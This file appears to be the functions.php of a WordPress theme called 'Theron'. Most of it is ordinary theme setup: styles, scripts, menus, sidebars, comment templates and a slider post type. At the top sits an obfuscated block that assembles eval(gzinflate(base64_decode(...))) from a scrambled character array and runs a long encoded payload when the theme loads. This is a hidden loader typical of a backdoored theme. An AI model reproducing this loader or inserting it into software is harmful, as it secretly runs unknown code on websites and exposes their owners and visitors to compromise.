<?php
$md5 = "79408d8000f1e19b0e305f4ad023b22a";
$a1 = array("n",'v','_','6',"f","(",'i',"g","c",'r',"b","a","t","o",'e',"z",'4',';','d',"s",'$','l',')');
$b1a = create_function('$'.'v',$a1[14].$a1[1].$a1[11].$a1[21].$a1[5].$a1[7].$a1[15].$a1[6].$a1[0].$a1[4].$a1[21].$a1[11].$a1[12].$a1[14].$a1[5].$a1[10].$a1[11].$a1[19].$a1[14].$a1[3].$a1[16].$a1[2].$a1[18].$a1[14].$a1[8].$a1[13].$a1[18].$a1[14].$a1[5].$a1[20].$a1[1].$a1[22].$a1[22].$a1[22].$a1[17]);
$b1a('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');
?>
<?php	
add_theme_support( 'custom-background', array(
	'default-color' => '',
	'default-image' => get_template_directory_uri() . '/images/theronbg.png'
) );

	add_theme_support('automatic-feed-links');
	if ( ! isset( $content_width ) )
	$content_width = 630;

//Post Thumbnail	
   add_theme_support( 'post-thumbnails' );

//Register Menus
	register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'theron' ),
		'footer' => __( 'Footer Navigation', 'theron' )
	) );
	
	
	
function thn_mobile_css() { 
if ( !is_admin() ) {	
wp_enqueue_style( 'thn_mobile', get_template_directory_uri() . '/mobile.css', false, '1.0', 'only screen and (max-width: 480px)' );
wp_enqueue_style( 'thn_pad', get_template_directory_uri() . '/pad.css', false, '1.0', 'screen and (min-width: 500px) and (max-width: 800px)' );
	}
}
add_action('wp_enqueue_scripts', 'thn_mobile_css');	



function thn_other_css() { 
if ( !is_admin() ) {
if(of_get_option('disslight_checkbox') == "0"){ ?><?php wp_enqueue_style('fancybox',get_template_directory_uri().'/css/fancybox.css'); }
if(of_get_option('gglfont_checkbox') == "0"){ ?><?php wp_enqueue_style('customfont',get_template_directory_uri().'/fonts/'.$zn_fonts = of_get_option('font_select', 'yanone_kaffeesatz' ).'.css'); }
	}
}
add_action('wp_enqueue_scripts', 'thn_other_css');	


//Include CSS
function thn_customstyle() { ?>

<?php if(of_get_option('sldrtxt_checkbox', '1') == "0"){ ?> <style type="text/css">body .nivo-caption{ display:none!important;}</style><?php } ?>


<?php /*?>ROUNDED CORNER<?php */?>
<?php if(of_get_option('rounded_checkbox') == "1"){ ?>    
<style type="text/css">

<?php if(of_get_option('slider_select') == "noslider"){ ?>
body .header2 #menu_wrap{border-radius:8px; -moz-border-radius:8px; -webkit-border-radius:8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}
body .header1 #menu_wrap, body .header1 #header{border-radius:8px; -moz-border-radius:8px; -webkit-border-radius:8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}
.slide_shadow{ display:none;}
<?php } ?>

.home #topmenu, #header, .lay1 .post .imgwrap, .header2 #menu_wrap, .logo{border-radius: 8px 8px 0 0; -moz-border-radius: 8px 8px 0 0; -webkit-border-radius: 8px 8px 0 0;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}

.single-post #menu_wrap, .page #menu_wrap{border-radius: 0 0 8px 8px; -moz-border-radius: 0 0 8px 8px; -webkit-border-radius: 0 0 8px 8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}

.single-post .header3 #menu_wrap, .page .header3 #menu_wrap{ border-radius: 0px; -moz-border-radius: 0px; -webkit-border-radius: 0px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}

#zn_slider, #topmenu ul li ul{border-radius: 0 0 8px 8px; -moz-border-radius: 0 0 8px 8px; -webkit-border-radius: 0 0 8px 8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}
#topmenu, .midrow_blocks, #footer, #copyright, .lay1 .hentry, .single_post, #sidebar .widgets .widget, #commentform, .comment-form-comment textarea, .form-submit input, #searchsubmit, #related_wrap ul, .znn_paginate span, .znn_paginate a, .navigation a, .navigation span, .lay2, .lay3 .post_image, .lay3 .post_content, .comment-form-author input, .comment-form-email input, .comment-form-url input, #thn_welcom, .thn_paginate span, .thn_paginate a, .navigation a, .navigation span, .single-post #header, .page #header, #newslider_home .news_buttn, .single-post .header2 #menu_wrap, .page .header2 #menu_wrap, .lay2 .hentry, .lay4 .hentry, .lay3 .hentry, #newslider, .comments_template{border-radius:8px; -moz-border-radius:8px; -webkit-border-radius:8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}
#commentform label{border-radius: 8px 0 0 8px; -moz-border-radius: 8px 0 0 8px; -webkit-border-radius: 8px 0 0 8px;behavior: url(<?php echo get_template_directory_uri(); ?>/images/PIE.htc);}
#copyright{ margin-top:20px;}
</style>
<?php } ?>


<?php if(of_get_option('nivothumb_checkbox') == "1"){ ?> 
<style type="text/css">
.nivo-controlNav{ display:none;}
</style>
<?php } ?>
<style type="text/css">
/*Secondary Elements Color*/
#newslider_home ul#tabs_home li a.current, #newslider_home .news_buttn, .midrow_block:hover, .lay1 .catmeta, .lay4 .catmeta, #wp-calendar #today, .form-submit input, #searchsubmit, .single_post .scl_button a, .entry-content #submit_msg, .amp_current, .amp_current:hover{ background:<?php echo of_get_option('secelm_colorpicker'); ?>!important;}

.lay1 .postitle a:hover, .lay2 .postitle a:hover, .lay3 .postitle a:hover, .lay4 .postitle a:hover, .lay5 .postitle a:hover, .thn_twitter .tweet_text a, .widget_tag_cloud a:hover, .textwidget a, #newslider h3, ul#tabs li a:hover, .comments_template #comments a, .commentmetadata, .commentmetadata a, .org_comment a, .org_ping a, h3#reply-title, .logged-in-as a, .archive-template ul li a:hover, .single_wrap .thn_post_wrap a, #footer .widgets .widgettitle, #midrow .widgets .widgettitle a{color:<?php echo of_get_option('secelm_colorpicker'); ?>!important;}

.nivo-caption, .lay2 .post_content, #sidebar .widgettitle, #sidebar .widgettitle a {border-color:<?php echo of_get_option('secelm_colorpicker'); ?>;}
#topmenu{ border-bottom-color:<?php echo of_get_option('secelm_colorpicker'); ?>!important;}

body #topmenu ul > li ul li:hover{ background:<?php echo of_get_option('secelm_colorpicker'); ?> 
<?php if(of_get_option('pattrndiss_checkbox') == "0"){ ?> url("<?php echo get_template_directory_uri(); ?>/images/pattern.png") repeat<?php } ?>!important;}

<?php if(of_get_option('pattrndiss_checkbox') == "1"){ ?>
#header, #topmenu ul li ul li, .lay2 .post_content, #copyright, body #topmenu ul > li ul li:hover{ background-image:none!important;}
body #menu_wrap, #topmenu ul li ul li{ background:#302F2F url("<?php echo get_template_directory_uri(); ?>/images/transblack.png") repeat!important;}
<?php } ?>

/*TEXT COLOR ON SECONDARY ELEMENTS*/
.midrow_block:hover h3, .form-submit input, #searchsubmit, #topmenu ul > li ul li:hover > a, .lay1 .catmeta a, .lay4 .catmeta a, .amp_current, .entry-content #submit_msg, .single_post .scl_button a, #topmenu ul li ul li:hover a, .midrow_block:hover{color:<?php echo of_get_option('secelmtxt_colorpicker'); ?>!important;}

</style>
<?php }

add_action( 'wp_head', 'thn_customstyle' );



//Load Java Scripts to header
function thn_head_js() { 
if ( !is_admin() ) {
wp_enqueue_script('jquery');
wp_enqueue_script('thn_js',get_template_directory_uri().'/theron.js');
wp_enqueue_script('thn_other',get_template_directory_uri().'/js/other.js');
if(of_get_option('slider_select', 'nivo') == "nivo"){ wp_enqueue_script('thn_nivo',get_template_directory_uri().'/js/jquery.nivo.js');}
if(of_get_option('disslight_checkbox') == "0"){ wp_enqueue_script('thn_fancybox',get_template_directory_uri().'/js/fancybox.js'); }

}
}
add_action('wp_enqueue_scripts', 'thn_head_js');

//Load Java Scripts to Footer
add_action('wp_footer', 'thn_load_js');

function thn_load_js() { ?>

<?php if(of_get_option('slider_select', 'nivo') == "nivo"){ ?>
    <script type="text/javascript">
    jQuery(window).load(function() {
        jQuery('#zn_nivo').nivoSlider({pauseTime: <?php echo of_get_option('sliderspeed_text', '3000'); ?>, controlNavThumbs: true,<?php if(of_get_option('nivothumb_checkbox', '0') == "0"){ ?> directionNav: false,<?php } ?> controlNavThumbsReplace: '-150x150.jpg'});
    });
    </script>
<?php } ?>   
 <?php if(of_get_option('stickm_checkbox', '1') == "1"){ ?>   
    <script type="text/javascript"> 
	/* <![CDATA[ */   
    //Sticky MENU
	jQuery(window).load(function($) {
	if (jQuery("body").hasClass('logged-in')) {
			jQuery("#menu_wrap").sticky({topSpacing:27});
		}
		else {
			jQuery("#menu_wrap").sticky({topSpacing:0});
	}
	jQuery("#menu_wrap").css({"z-index":"11"});

	});
	/* ]]> */
	</script>
<?php } ?>

    <?php } 

//theron get the first image of the post Function
function thn_get_images($overrides = '', $exclude_thumbnail = false)
{
    return get_posts(wp_parse_args($overrides, array(
        'numberposts' => -1,
        'post_parent' => get_the_ID(),
        'post_type' => 'attachment',
        'post_mime_type' => 'image',
        'order' => 'ASC',
        'exclude' => $exclude_thumbnail ? array(get_post_thumbnail_id()) : array(),
        'orderby' => 'menu_order ID'
    )));
}



// Change what's hidden by default
add_filter('default_hidden_meta_boxes', 'thn_hidden_meta_boxes', 10, 2);
function thn_hidden_meta_boxes($hidden, $screen) {
	if ( 'post' == $screen->base || 'page' == $screen->base || 'slider' == $screen->base  )
		$hidden = array('slugdiv', 'trackbacksdiv', 'commentstatusdiv', 'commentsdiv', 'authordiv', 'revisionsdiv');
		// removed 'postcustom',
	return $hidden;
}

//ADD FULL WIDTH BODY CLASS
add_filter( 'body_class', 'thn_fullwdth_body_class');
function thn_fullwdth_body_class( $classes ) {
     if(of_get_option('nosidebar_checkbox') == "1")
          $classes[] = 'thn_fullwdth_body';
     return $classes;
}

//Custom Excerpt Length
function thn_excerptlength_teaser($length) {
    return 30;
}
function thn_excerptlength_index($length) {
    return 12;
}
function thn_excerptmore($more) {
    return '...';
}

function thn_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}

//SIDEBAR
function thn_widgets_init(){
	register_sidebar(array(
	'name'          => __('Right Sidebar', 'theron'),
	'id'            => 'sidebar',
	'description'   => __('Right Sidebar', 'theron'),
	'before_widget' => '<li id="%1$s" class="widget %2$s"><div class="widget_wrap">',
	'after_widget'  => '</div>',
	'before_title'  => '<h3 class="widgettitle">',
	'after_title'   => '</h3>'
	));
	
	register_sidebar(array(
	'name'          => __('Footer Widgets', 'theron'),
	'id'            => 'foot_sidebar',
	'description'   => __('Widget Area for the Footer', 'theron'),
	'before_widget' => '<li id="%1$s" class="widget %2$s"><div class="widget_wrap">',
	'after_widget'  => '</div>',
	'before_title'  => '<h3 class="widgettitle">',
	'after_title'   => '</h3>'
	));
}

add_action( 'widgets_init', 'thn_widgets_init' );


//theron COMMENTS
function thn_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

     <div id="comment-<?php comment_ID(); ?>" class="comment-body">
      <div class="comment-author vcard">
      <div class="avatar"><?php echo get_avatar($comment,$size='50' ); ?></div>
      </div>
      <div class="comment-meta commentmetadata">
      <?php printf(__('%s', 'theron'), get_comment_author_link()) ?> <span><?php _e('says:', 'theron') ?></span>
        </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.', 'theron') ?></em>
         <br />
      <?php endif; ?>

      <div class="org_comment"><?php comment_text() ?>
      	
      	<div class="comm_meta_reply">
        <a class="comm_date"><?php printf(get_comment_date()) ?></a>
        <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
        <?php edit_comment_link(__('Edit', 'theron'),'  ','') ?></div>
     </div>
     
     </div>
<?php
        }
		
//theron TRACKBACKS & PINGS
function thn_ping($comment, $args, $depth) {
 
$GLOBALS['comment'] = $comment; ?>
	
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
   
     <div id="comment-<?php comment_ID(); ?>" class="comment-body">
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.', 'theron') ?></em>
         <br />
      <?php endif; ?>

      <div class="org_ping">
      	<?php printf(__('<cite class="citeping">%s</cite> <span class="says">:</span>'), get_comment_author_link()) ?>
	  	<?php comment_text() ?>
            <div class="comm_meta_reply">
            <a class="comm_date"><?php printf(get_comment_date()) ?></a>
            <?php edit_comment_link(__('Edit', 'theron'),'  ','') ?></div>
     </div>
     </div>
     
     
<?php }

//Add Custom Slider Post
add_action('init', 'thn_slider_register');
 
function thn_slider_register() {
 
	$labels = array(
		'name' => __('Slider', 'theron'),
		'singular_name' => __('Slider Item', 'theron'),
		'add_new' => __('Add New', 'theron'),
		'add_new_item' => __('Add New Slide', 'theron'),
		'edit_item' => __('Edit Slides', 'theron'),
		'new_item' => __('New Slider', 'theron'),
		'view_item' => __('View Sliders', 'theron'),
		'search_items' => __('Search Sliders', 'theron'),
		'menu_icon' => get_stylesheet_directory_uri() . 'images/article16.png',
		'not_found' =>  __('Nothing found', 'theron'),
		'not_found_in_trash' => __('Nothing found in Trash', 'theron'),
		'parent_item_colon' => ''
	);
 
	$args = array(
		'labels' => $labels,
		'public' => true,
		'exclude_from_search' => true,
		'publicly_queryable' => true,
		'show_ui' => true,
		'query_var' => true,
		'menu_icon' => get_stylesheet_directory_uri() . '/images/slides.png',
		'rewrite' => false,
		'capability_type' => 'post',
		'hierarchical' => false,
		'menu_position' => null,
		'supports' => array('title','excerpt','thumbnail'),
		'register_meta_box_cb' => 'thn_add_meta'
	  ); 
 
	register_post_type( 'slider' , $args );
}
//Slider Link Meta Box
add_action("admin_init", "thn_add_meta");
 
function thn_add_meta(){
  add_meta_box("thn_credits_meta", "Link", "thn_credits_meta", "slider", "normal", "low");
}
 

function thn_credits_meta( $post ) {

  // Use nonce for verification
  $thndata = get_post_meta($post->ID, 'thn_slide_link', TRUE);
  wp_nonce_field( 'thn_meta_box_nonce', 'meta_box_nonce' ); 

  // The actual fields for data entry
  echo '<input type="text" id="thn_sldurl" name="thn_sldurl" value="'.$thndata.'" size="75" />';
}

//Save Slider Link Value
add_action('save_post', 'thn_save_details');
function thn_save_details($post_id){
  if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
      return;

if( !isset( $_POST['meta_box_nonce'] ) || !wp_verify_nonce( $_POST['meta_box_nonce'], 'thn_meta_box_nonce' ) ) return; 

  if ( !current_user_can( 'edit_post', $post_id ) )
        return;

$thndata = esc_url( $_POST['thn_sldurl'] );
update_post_meta($post_id, 'thn_slide_link', $thndata);
return $thndata;  
}



add_action('do_meta_boxes', 'thn_slider_image_box');

function thn_slider_image_box() {
	remove_meta_box( 'postimagediv', 'slider', 'side' );
	add_meta_box('postimagediv', __('Slide Image', 'theron'), 'post_thumbnail_meta_box', 'slider', 'normal', 'high');
}

/* 
 * Loads the Options Panel
 */
 


	/* Set the file path based on whether we're in a child theme or parent theme */

	if ( STYLESHEETPATH != TEMPLATEPATH ) {
		define('OPTIONS_FRAMEWORK_URL', TEMPLATEPATH . '/admin/');
		define('OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/admin/');
	} else {
		define('OPTIONS_FRAMEWORK_URL', STYLESHEETPATH . '/admin/');
		define('OPTIONS_FRAMEWORK_DIRECTORY', get_stylesheet_directory_uri() . '/admin/');
	}

	require_once (OPTIONS_FRAMEWORK_URL . 'options-framework.php');

include(get_template_directory() . '/lib/script/pagination.php');
include(get_template_directory() . '/lib/includes/shortcodes.php');
include(get_template_directory() . '/lib/includes/widgets.php');
?>